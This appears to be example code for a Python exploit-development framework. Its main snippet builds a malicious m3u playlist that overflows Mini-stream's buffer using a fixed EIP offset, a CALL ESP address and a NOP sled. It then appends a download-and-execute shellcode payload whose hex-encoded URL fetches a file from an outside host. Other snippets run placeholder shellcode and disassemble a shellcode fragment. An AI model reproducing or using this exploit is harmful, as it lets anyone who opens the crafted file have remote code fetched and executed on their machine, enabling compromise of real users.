import framework
from framework import WinShellcode as WShellcode

#Execute Shellcode
payload = ("Shellcode"
           "Here")
framework.Shellcode(payload).execute()

# -------------------------------------------------------------

# Exploit Mini-stream bof via malicous m3u file; download and execute file

# url= link to file (hex, use the same format as below)
url = "\x68\x74\x74\x70\x3A\x2F\x2F\x70\x79\x74\x68\x6F\x6E\x69\x6D\x70\x6F\x72\x74\x73\x2E\x77\x65\x65\x62\x6C\x79\x2E\x63\x6F\x6D\x2F\x75\x70\x6C\x6F\x61\x64\x73\x2F\x31\x2F\x31\x2F\x32\x2F\x31\x2F\x31\x31\x32\x31\x35\x32\x33\x30\x2F\x78\x79\x2E\x74\x78\x74"
payload = WShellcode["DownloadAndExecute"]+url


EIP_Offset = 17417
junk = "A" * EIP_Offset 
ESP ="\xF5\x71\x03\x10" # 0x100371F5 (CALL ESP); Jumps to our shellcode
NopSled = framework.Nop(20) 


f = open("bad.m3u", "w+")
f.write("http://" + junk + ESP + NopSled + payload)
f.close()

# ----------------------------------------------------------------------

# ----------------------------------------------------------------------

# Make sure all WEDF modules are in the directory;
import framework
from framework import WinShellcode as WShellcode


# "Shellcode"
sc = ("\x68\x97\x4C\x80\x7C\xB8"
    "\x4D\x11\x86\x7C\xFF\xD0")
   
# Disassemble the shellcode using ndisasm. (mode=32)
d = framework.Disasm(sc, 32)
# Output=
# 00000000  68974C807C        push dword 0x7c804c97
# 00000005  B84D11867C        mov eax,0x7c86114d
# 0000000A  FFD0              call eax

# gets shellcode from ndisasm output
get_shellcode = framework.Asm(d)
# looks like
#"\x68\x97\x4c\x80\x7c" 
#"\xb8\x4d\x11\x86\x7c" 
#"\xff\xd0"   



